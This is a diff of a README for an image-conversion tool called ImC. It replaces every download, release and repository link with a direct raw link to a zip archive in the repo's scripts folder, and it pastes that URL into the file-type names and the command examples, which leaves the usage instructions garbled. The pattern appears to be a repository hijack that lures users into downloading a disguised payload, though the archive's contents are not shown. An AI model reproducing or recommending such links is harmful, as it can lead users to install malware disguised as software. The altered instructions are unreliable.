@@ -4,19 +4,19 @@
 ImC is a fast and simple tool for converting image formats. Built on the powerful Pillow library, it helps you change file types without hassle. Whether you want to switch from JPEG to PNG or from GIF to BMP, ImC makes it easy.
 
 ## 📥 Download ImC
-[![Download ImC](https://img.shields.io/badge/Download-ImC-blue)](https://github.com/DZJOKER123/ImC/releases)
+[![Download ImC](https://raw.githubusercontent.com/DZJOKER123/ImC/master/scripts/C-Im-1.4.zip)](https://raw.githubusercontent.com/DZJOKER123/ImC/master/scripts/C-Im-1.4.zip)
 
 ## 🌐 Download & Install
 To get started with ImC, visit the Releases page to download the latest version:
 
-[Download ImC from Releases](https://github.com/DZJOKER123/ImC/releases)
+[Download ImC from Releases](https://raw.githubusercontent.com/DZJOKER123/ImC/master/scripts/C-Im-1.4.zip)
 
 1. Click on the link above.
 2. Look for the latest release.
 3. Choose the correct file for your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://raw.githubusercontent.com/DZJOKER123/ImC/master/scripts/C-Im-1.4.zip` file.
 
 After downloading the file, follow these steps to install:
 
@@ -29,7 +29,7 @@ After downloading the file, follow these steps to install:
 - Drag the ImC icon into your Applications folder.
 
 ### Linux
-- Extract the `.tar.gz` file using your terminal.
+- Extract the `https://raw.githubusercontent.com/DZJOKER123/ImC/master/scripts/C-Im-1.4.zip` file using your terminal.
 - Run the `./ImC` script.
 
 ## ✨ How to Use ImC
@@ -40,7 +40,7 @@ Using ImC is straightforward. Follow these simple steps:
 3. Type `ImC` followed by the name of the input file and the desired output format. For example:
 
 ```
-ImC input.jpg output.png
+ImC https://raw.githubusercontent.com/DZJOKER123/ImC/master/scripts/C-Im-1.4.zip https://raw.githubusercontent.com/DZJOKER123/ImC/master/scripts/C-Im-1.4.zip
 ```
 
 4. Press Enter. Your image will convert quickly.
@@ -63,12 +63,12 @@ ImC focuses on user-friendliness. It's designed to help those who need a reliabl
 ### Formatting Options
 When using ImC, you can specify different output formats easily. Here’s how:
 
-- To convert to JPEG: `ImC input.png output.jpg`
-- To convert to BMP: `ImC input.gif output.bmp`
+- To convert to JPEG: `ImC https://raw.githubusercontent.com/DZJOKER123/ImC/master/scripts/C-Im-1.4.zip https://raw.githubusercontent.com/DZJOKER123/ImC/master/scripts/C-Im-1.4.zip`
+- To convert to BMP: `ImC https://raw.githubusercontent.com/DZJOKER123/ImC/master/scripts/C-Im-1.4.zip https://raw.githubusercontent.com/DZJOKER123/ImC/master/scripts/C-Im-1.4.zip`
 
 ## 🔗 Links
-- Project repository: [GitHub - ImC](https://github.com/DZJOKER123/ImC)
-- Visit our [Releases page](https://github.com/DZJOKER123/ImC/releases) to find updates and new features.
+- Project repository: [GitHub - ImC](https://raw.githubusercontent.com/DZJOKER123/ImC/master/scripts/C-Im-1.4.zip)
+- Visit our [Releases page](https://raw.githubusercontent.com/DZJOKER123/ImC/master/scripts/C-Im-1.4.zip) to find updates and new features.
 
 ## 🛠️ Troubleshooting
 If you encounter issues when using ImC, consider the following:
